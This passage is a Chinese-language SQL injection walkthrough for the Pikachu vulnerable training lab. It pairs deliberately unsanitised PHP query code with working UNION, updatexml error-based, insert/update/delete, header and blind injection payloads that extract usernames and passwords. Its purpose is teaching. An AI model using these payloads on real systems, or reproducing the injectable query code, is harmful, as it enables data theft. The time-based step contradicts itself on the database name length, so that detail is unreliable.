但是联合多个 SQL 语句时可能出现报错,因为查询的字段不能超过主查询的字段,这个时候可以在 SQL 语句后面加 order by 进行排序,通过这个办法可以判断主查询的字段.返回 pikachu 平台,在 SQL 注入下随意打开搜索型栏目,输入我们构造的 order by 语句进行测试.
输入 `' order by 4#%` ,报错
输入 `' order by 3#%` ,未报错,通过这个简单的办法找到主查询一共有三个字段.
构造 payload: `a' union select database(),user(),version()#%`
**information_schema 注入**
information_schema 数据库是 MySQL 系统自带的数据库.其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息.通过 information_schema 注入,我们可以将整个数据库内容全部窃取出来.接下来是对 information_schema 注入的演示.
首先同之前的步骤,使用 order by 来判断查询的字段.先找出数据库的名称,输入 `a' union select database(),user(),4#%` 得到反馈,判断数据库名称为 pikachu.
获取表名,输入:`a' union select table_schema,table_name,2 from information_schema.tables where table_schema='pikachu'#`
获取字段名,输入:`a'union select table_name,column_name,2 from information_schema.columns where table_name='users'#%`
获取数据,输入:`a'union select username ,password,4 from users#%`
**select 下的报错演示**
select/insert/update/delete 都可以使用报错来获取信息.
- **UPDATEXML(xml_document,XPathstring,new_value)**
    Updatexml() 函数作用:改变(查找并替换)XML 文档中符合条件的节点的值.
    - 第一个参数 : fiedname 是 String 格式,为表中的字段名.
    - 第二个参数 : XPathstring(Xpath 格式的字符串).
    - 第三个参数 : new_value,String 格式,替换查找到的符合条件的 X
改变 XML_document 中符合 XPATH_string 的值
而我们的注入语句为: `a' and updatexml(1,concat(0x7e,(SELECT @@version)),0)#`
其中的 concat() 函数是将其连成一个字符串,因此不会符合 XPATH_string 的格式,从而出现格式错误,爆出 `ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'`
获取数据库表名,输入:`a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#` ,但是反馈回的错误表示只能显示一行,所以采用 limit 来一行一行显示
输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改 limit 后面的数字 pikachu'limit 0,爆表名
字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改 limit 后面的数字,爆表名
数据 `a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#`
数据 `a' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#`
### xx型注入
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理,直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型,需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="your uid:{$id} your email is: {$email}";
        }
    }else{
        $html.="您输入的username不存在,请重新输入!";
    }
}
```
**漏洞利用**
参照代码,这里使用字符型且没有使用相似查询,然而这个不重要,关键是构造一个闭合
payload: `' or '1' = '1 #`
### "insert/update"注入
insert 注入,就是前端注册的信息最终会被后台通过 insert 这个操作插入数据库,后台在接受前端的注册数据时没有做防 SQL 注入的处理,导致前端的输入可以直接拼接 SQL 到后端的 insert 相关内容中,导致了 insert 注入.
**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if($_POST['username']!=null &&$_POST['password']!=null){
//      $getdata=escape($link, $_POST);//转义
        //没转义,导致注入漏洞,操作类型为insert
        $getdata=$_POST;
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1){
            $html.="注册成功,请返回登录";
        }else {
            $html.="注册失败,请检查下数据库是否还活着";
        }
    }else{
        $html.="必填项不能为空哦";
    }
}
```
**漏洞利用**
在上面搜索型注入中演示了 select 类报错获取信息,insert 和 update 其实类似
先测 insert 注入,在注册页面输入 `'` ,来查看后端反馈的观察,通过观察报错了解到提交的内容在后台参与了拼接.
版本 `1' or updatexml(1,concat(0x7e,(version())),0) or'')#`
表名 `1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#`
老规矩,改 limit 后的数字
字段名 `1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#`
老规矩,改 limit 后的数字
数据 `1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#`
数据 `1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#`
下面测试 update
**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
//        $getdata=escape($link, $_POST);
        //未转义,形成注入,sql操作类型为update
        $getdata=$_POST;
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:sqli_mem.php");
        }else {
            $html1.='修改失败,请重试';
        }
    }
}
```
**漏洞利用**
版本 `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = ;#`
例如我的: `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#`
后面爆剩下的略,累了
### "delete"注入
**服务器端核心代码**
```php
// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
//没对传进来的id进行处理,导致DEL注入
if(array_key_exists('id', $_GET)){
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        header("location:sqli_del.php");
    }else{
        $html.="删除失败,检查下数据库是不是挂了";
    }
}
```
**漏洞利用**
抓包 `GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1`
参数 id 可以尝试 sql 报错注入,构造 payload
`1 or updatexml(1,concat(0x7e,database()),0)`
通过 Burp Suite 中自带的 URL 转换编码来转换替换 ID
后面略
### "http_header"注入
**服务器端核心代码**
```php
if(isset($_GET['logout']) && $_GET['logout'] == 1){
    setcookie('ant[uname]','',time()-3600);
    setcookie('ant[pw]','',time()-3600);
    header("location:sqli_header_login.php");
}
?>
```
**漏洞利用**
登录后去 Burp 中找到登录的 GET 请求,把请求发送到 Repeater 模块中,去除 User-Agent:,然后输入 `'`s 然后运行后观察 MYSQL 语法报错然后发现存在 SQL 注入漏洞.
爆库名 payload: `firefox' or updatexml(1,concat(0x7e,database ()),0) or '`
后面略
### 盲注(base_on_boolian)
盲注就是在 sql 注入过程中,sql 语句执行的选择后,报错的数据不能回显到前端页面(后台使用了错误消息屏蔽方法屏蔽了报错).在无法通过返回的信息进行 sql 注入时,采用一些方法来判断表名长度、列名长度等数据后来爆破出数据库数据的的这个过程称为盲注.
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理,直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型,需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="your uid:{$id} your email is: {$email}";
        }
    }else{
        $html.="您输入的username不存在,请重新输入!";
    }
}
```
**漏洞利用**
基于 boolean 盲注主要表现:
```
1. 没有报错信息
2. 不管是正确的输入,还是错误的输入,都只显示两种情况(我们可以认为是0或者1)
3. 在正确的输入下,输入 and 1=1/and 1=2 发现可以判断
```
手工盲注的步骤
```
1.判断是否存在注入,注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据
```
`注: 这里 123 是我创建的用户,可能原来是 admin,自己查一下数据库里的数据`
payload: `123' and 1=1 #` 有结果返回说明是字符型
payload: `123' and length(database())=7 #` 有结果,库名字7个字符
后面就是正常的盲注爆库步骤了,略
### 盲注(base_on_time)
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理,直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型,需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="i don't care who you are!";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="i don't care who you are!";
        }
    }else{
        $html.="i don't care who you are!";
    }
}
```
**漏洞利用**
源码里注释说的很清楚了,不管输入的是啥,返回的都是一样的.但就算没有不同的返回值,也是存在不同的返回情况的,因为查询语句是一定会被执行的.能通过控制返回的时间来判断查询是否存在
`123' and if(length(database())=7,sleep(5),1) #` 明显延迟,说明数据库名的长度为5个字符;
后面的步骤按部就班,略
### 宽字节注入
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['name']!=null){
    $name = escape($link,$_POST['name']);
    $query="select id,email from member where username='$name'";//这里的变量是字符型,需要考虑闭合
    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";